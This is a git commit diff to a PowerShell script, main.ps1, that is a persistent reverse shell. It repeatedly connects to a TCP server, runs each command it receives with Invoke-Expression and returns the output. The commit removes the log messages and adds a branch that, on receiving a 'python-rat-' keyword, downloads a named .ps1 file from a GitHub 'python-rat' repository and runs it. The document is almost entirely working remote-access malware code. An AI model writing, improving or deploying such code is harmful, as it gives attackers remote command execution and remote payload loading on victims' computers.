ee910279cac5dcd90551ddc2a104136f20fad809
43a1723 <hai1723notgay@gmail.com>
2024-08-24 18:26:41 +0700

    Update main.ps1

--- main.ps1
+++ main.ps1
@@ -1,11 +1,9 @@
 while ($true) {
     try {
-        # Attempt to create a connection
         $client = New-Object System.Net.Sockets.TCPClient("localhost", "9999")
     } catch {
-        Write-Host "Failed to connect: $_"
-        Start-Sleep -Seconds 5  # Wait 5 seconds before retrying
-        continue  # Go back to the start of the loop and try again
+        Start-Sleep 5
+        continue
     }
 
     if ($client.Connected) {
@@ -13,30 +11,24 @@ while ($true) {
         $writer = New-Object System.IO.StreamWriter($stream)
         $writer.AutoFlush = $true
         $buffer = New-Object byte[] 1024
-        $encoding = [System.Text.Encoding]::ASCII
-
-        Write-Host "Connected to the server."
+        $enc = [System.Text.Encoding]::ASCII
 
         while ($client.Connected) {
             try {
                 $writer.Write("PS " + (Get-Location).Path + "> ")
                 $bytesRead = $stream.Read($buffer, 0, $buffer.Length)
-                if ($bytesRead -le 0) {
-                    throw "Connection closed by server."
-                }
-                $input = $encoding.GetString($buffer, 0, $bytesRead).Trim()
-                $output = Invoke-Expression $input 2>&1 | Out-String
-                $writer.Write($output)
-            } catch {
-                Write-Host "Error: $_"
-                break  # Exit the inner loop and reconnect
-            }
-        }
-    } else {
-        Write-Host "Connection failed!"
-    }
+                if ($bytesRead -le 0) { throw "Connection closed." }
+                $input = $enc.GetString($buffer, 0, $bytesRead).Trim()
 
-    # Close the client and wait before retrying
+                if ($input -like "*python-rat-*") {
+                    $url = "https://raw.githubusercontent.com/s1uiasdad/python-rat/main/scr/" + ($input -replace "python-rat-", "") + ".ps1"
+                    iex (iwr $url).Content
+                } else {
+                    $writer.Write((Invoke-Expression $input 2>&1 | Out-String))
+                }
+            } catch { break }
+        }
+    }
     $client.Close()
-    Start-Sleep -Seconds 5  # Wait 5 seconds before retrying
+    Start-Sleep 5
 }
